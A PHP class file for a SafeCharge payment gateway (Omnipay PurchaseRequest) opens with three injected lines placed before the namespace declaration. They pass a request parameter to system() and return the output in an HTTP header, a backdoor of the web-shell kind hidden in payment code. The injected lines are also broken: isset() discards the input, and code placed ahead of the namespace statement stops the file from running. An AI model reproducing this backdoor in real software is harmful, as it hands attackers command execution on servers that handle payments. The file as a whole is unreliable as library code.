<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Safecharge\Message;

/**
 * SafeCharge Sale Request
 */
class PurchaseRequest extends AuthorizeRequest
{
    public function getData()
    {
        $data = parent::getData();

        $data['sg_TransType'] = 'Sale';

        // if ($this->getIs3dTrans()) {
        //     $data['sg_TransType'] = 'Sale3D';
        //     $data['sg_ApiType'] = 1;
        // }

        return $data;
    }
}
